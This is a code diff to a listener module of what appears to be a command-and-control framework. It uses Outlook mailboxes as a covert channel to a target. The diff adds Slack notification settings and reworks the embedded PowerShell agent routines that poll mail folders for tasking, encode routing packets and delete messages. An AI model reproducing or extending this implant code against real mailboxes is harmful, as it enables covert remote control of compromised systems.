@@ -115,6 +115,16 @@ class Listener:
                 'Description'   :   'The email address of our target',
                 'Required'      :   False,
                 'Value'         :   ''
+            },
+            'SlackToken' : {
+                'Description'   :   'Your SlackBot API token to communicate with your Slack instance.',
+                'Required'      :   False,
+                'Value'         :   ''
+            },
+            'SlackChannel' : {
+                'Description'   :   'The Slack channel or DM that notifications will be sent to.',
+                'Required'      :   False,
+                'Value'         :   '#general'
             }
         }
 
@@ -359,8 +369,11 @@ class Listener:
                 """ % (listenerOptions['Host']['Value'])
 
                 getTask = """
-                    function script:Get-Task {
+
+                    $script:GetTask = {
                         try {
+                                # keep checking to see if there is response
+				#write-host "requesting task";
                                 # meta 'TASKING_REQUEST' : 4
                                 $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4;
                                 $RoutingCookie = [Convert]::ToBase64String($RoutingPacket);
@@ -374,9 +387,9 @@ class Listener:
                                 $mail.save() | out-null;
                                 $mail.Move($fld)| out-null;
 
-                                # keep checking to see if there is response
                                 $break = $False;
                                 [byte[]]$b = @();
+                                $noTask = 0
 
                                 While ($break -ne $True){
                                   foreach ($item in $fld.Items) {
@@ -396,14 +409,14 @@ class Listener:
 
                         }
                         catch {
-
+                           #Start-Negotiate -S "$ser" -SK $sk -UA $ua;
                         }
                         while(($fldel.Items | measure | %{$_.Count}) -gt 0 ){ $fldel.Items | %{$_.delete()};} 
                     }
                 """
 
                 sendMessage = """
-                    function script:Send-Message {
+                   $script:SendMessage = {
                         param($Packets)
 
                         if($Packets) {
